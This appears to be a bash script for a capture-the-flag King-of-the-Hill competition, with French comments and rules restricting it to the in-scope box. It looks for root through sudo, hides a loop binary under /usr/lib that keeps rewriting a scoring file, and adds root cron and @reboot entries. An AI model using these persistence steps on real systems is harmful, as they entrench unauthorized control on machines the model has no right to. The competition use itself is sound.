#!/usr/bin/env bash
# =====================================================================
# NCTF26 FINALE — persistance KoTH ON-BOX (generique, parametre)
# A executer SUR la box de la colline UNIQUEMENT si on y a un shell in-scope
# (le scoring = un "king file" sur la box). Survit a la fermeture du shell et
# au reboot, jusqu'au reset du conteneur.
#
# PARAMETRES (env, rien en dur) :
#   KOTH_TOKEN   jeton/valeur a ecrire dans le king file           (REQUIS)
#   KING_FILE    chemin du king file sur la box (ex: /koth/king)    (REQUIS)
#   KING_FILE2   second emplacement eventuel (ex: /king/king.txt)   (optionnel)
#   HOLD_BIN     chemin de la boucle installee (def: /usr/lib/.koth-hold)
#
# REGLES : box de la colline IN-SCOPE uniquement. Pas de DoS, pas d'attaque des
# autres equipes / de l'infra orga. Ne jamais toucher au serveur du challenge
# en dehors de ce que le scoring KoTH permet.
#
# USAGE :  KOTH_TOKEN=xxxx KING_FILE=/koth/king bash onbox_persist.sh
# =====================================================================
set -u
: "${KOTH_TOKEN:?definir KOTH_TOKEN}"
: "${KING_FILE:?definir KING_FILE (ex: /koth/king)}"
KING_FILE2="${KING_FILE2:-}"
HOLD_BIN="${HOLD_BIN:-/usr/lib/.koth-hold}"

# 1) obtenir root (tester les vecteurs courants, sans rien forcer de destructeur)
if [ "$(id -u)" = "0" ]; then
  RUN(){ sh -c "$1"; }; echo "[+] deja root"
elif sudo -n /usr/bin/env true 2>/dev/null; then
  RUN(){ sudo -n /usr/bin/env sh -c "$1"; }; echo "[+] root via sudo -n /usr/bin/env"
elif sudo -n true 2>/dev/null; then
  RUN(){ sudo -n sh -c "$1"; }; echo "[+] root via sudo -n"
else
  echo "[!] pas de vecteur root non-interactif : pose la persistance en user (portee reduite)"
  RUN(){ sh -c "$1"; }
fi

# 2) installer la boucle de maintien (reecrit le king file en continu), detachee
RUN "cat > '$HOLD_BIN' <<'EOF'
#!/bin/sh
T='$KOTH_TOKEN'
F='$KING_FILE'
F2='$KING_FILE2'
exec 9>/tmp/.koth-hold.lock
flock -n 9 2>/dev/null || exit 0
while :; do
  [ \"\$(cat \"\$F\" 2>/dev/null)\" != \"\$T\" ] && printf '%s\n' \"\$T\" > \"\$F\" 2>/dev/null
  [ -n \"\$F2\" ] && printf '%s\n' \"\$T\" > \"\$F2\" 2>/dev/null
  sleep 0.5
done
EOF
chmod 755 '$HOLD_BIN'"

# 3) cron (si cron tourne) + @reboot, puis lancement immediat detache (reparent pid1)
RUN "printf '%s\n' '* * * * * root /bin/sh $HOLD_BIN' '@reboot root /bin/sh $HOLD_BIN' > /etc/cron.d/koth-hold 2>/dev/null; chmod 644 /etc/cron.d/koth-hold 2>/dev/null; (command -v cron >/dev/null 2>&1 && (service cron start 2>/dev/null || cron 2>/dev/null &)) || true"
RUN "setsid /bin/sh '$HOLD_BIN' >/dev/null 2>&1 &"

# 4) planter le jeton tout de suite + verifier
RUN "printf '%s\n' '$KOTH_TOKEN' > '$KING_FILE' 2>/dev/null; [ -n '$KING_FILE2' ] && printf '%s\n' '$KOTH_TOKEN' > '$KING_FILE2' 2>/dev/null; echo \"[+] king=\$(cat '$KING_FILE' 2>/dev/null)\""
echo "[+] persistance posee : $HOLD_BIN (setsid actif) + /etc/cron.d/koth-hold (@reboot)"
echo "[i] rappel : in-scope uniquement. Pour retirer : rm -f $HOLD_BIN /etc/cron.d/koth-hold ; pkill -f $HOLD_BIN"
